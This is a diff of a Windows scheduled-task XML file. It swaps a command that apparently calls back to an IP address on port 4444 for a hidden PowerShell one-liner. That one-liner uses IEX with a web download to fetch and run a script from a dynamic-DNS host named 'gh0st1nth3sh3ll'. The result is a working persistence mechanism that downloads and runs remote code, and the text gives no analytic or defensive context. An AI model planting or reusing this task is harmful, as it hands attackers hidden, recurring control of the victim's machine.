@@ -38,8 +38,8 @@
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Windows\System32\SystemTask.exe</Command>
-      <Arguments>192.168.149.1 4444</Arguments>
+      <Command>powershell</Command>
+      <Arguments>-nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:80/a'))"</Arguments>
     </Exec>
   </Actions>
 </Task>
